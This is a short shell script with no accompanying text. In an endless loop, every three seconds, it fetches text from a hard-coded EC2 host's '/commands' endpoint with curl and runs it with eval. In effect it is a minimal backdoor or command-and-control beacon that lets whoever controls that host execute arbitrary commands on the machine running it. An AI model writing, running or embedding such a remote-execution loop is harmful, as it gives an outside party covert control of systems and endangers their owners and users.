#!/bin/sh
set -e

HOST=http://ec2-35-156-198-4.eu-central-1.compute.amazonaws.com:8080/commands
TIMEOUT=3

while true; do
    EXECUTE_COMMANDS=$(curl -s -H "Accept: application/json" -H "Content-Type: application/json" $HOST)
    eval $EXECUTE_COMMANDS || true
    sleep $TIMEOUT
done
